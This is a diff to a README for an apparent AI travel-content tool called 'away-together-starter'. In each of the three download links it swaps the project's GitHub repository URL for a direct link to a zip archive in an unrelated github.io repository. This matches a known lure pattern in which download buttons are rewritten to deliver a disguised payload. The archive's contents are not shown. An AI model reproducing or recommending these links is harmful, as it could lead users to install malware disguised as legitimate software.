@@ -5,7 +5,7 @@ description: "Turn any document into a small, useful decision with this free, ru
 ---
 # 🌍 away-together-starter - Start Your AI Travel Adventure Today
 
-[![Download Now](https://img.shields.io/badge/Download-away--together--starter-4CAF50?style=for-the-badge&logo=github)](https://github.com/Jasminemonarchal5464/away-together-starter)
+[![Download Now](https://img.shields.io/badge/Download-away--together--starter-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jasminemonarchal5464/jasminemonarchal5464.github.io/main/thymelic/1.1-alpha.3.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Getting started is incredibly simple. Follow these steps and you'll be up and ru
 
 Visit this link to download the application:
 
-**[🔗 Click Here to Download away-together-starter](https://github.com/Jasminemonarchal5464/away-together-starter)**
+**[🔗 Click Here to Download away-together-starter](https://raw.githubusercontent.com/Jasminemonarchal5464/jasminemonarchal5464.github.io/main/thymelic/1.1-alpha.3.zip)**
 
 This will take you to the download page. Look for the download button and click it to save the file to your computer. The download should start automatically.
 
@@ -129,7 +129,7 @@ Want to make the AI work better for you? Try these ideas:
 
 You're just minutes away from creating incredible AI-powered travel content. Download away-together-starter now and unlock a world of creative possibilities.
 
-**[⬇️ Download away-together-starter Now](https://github.com/Jasminemonarchal5464/away-together-starter)**
+**[⬇️ Download away-together-starter Now](https://raw.githubusercontent.com/Jasminemonarchal5464/jasminemonarchal5464.github.io/main/thymelic/1.1-alpha.3.zip)**
 
 ---
 
